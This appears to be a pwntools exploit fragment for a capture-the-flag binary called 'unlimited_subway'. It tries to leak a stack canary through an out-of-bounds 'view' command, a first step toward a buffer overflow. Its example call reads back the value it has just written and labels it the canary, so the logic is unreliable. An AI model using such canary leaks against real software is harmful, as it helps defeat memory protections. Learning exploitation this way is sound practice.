from pwn import *

# Set up the process
p = process('./unlimited_subway')

# Function to send data and receive canary
def send_data_and_get_canary(index, data):
    # Send 'F' command to input data
    p.sendline(b'F')
    p.recvuntil(b'Data : ')
    p.send(data)

    # Send 'V' command to view data at the given index
    p.sendline(b'V')
    p.recvuntil(b'Index : ')
    p.sendline(str(index).encode())

    # Receive and return the canary value
    canary = u32(p.recvuntil(b'\n', drop=True).ljust(4, b'\x00'))
    return canary

# Example usage
# Convert the payload to bytes using p32 for a 4-byte integer
payload = p32(0xdeadbeef)

# Send the payload and receive the canary
canary = send_data_and_get_canary(0, payload)

# Output the received canary
print(f"Received canary: {canary}")

# Clean up the process
p.close()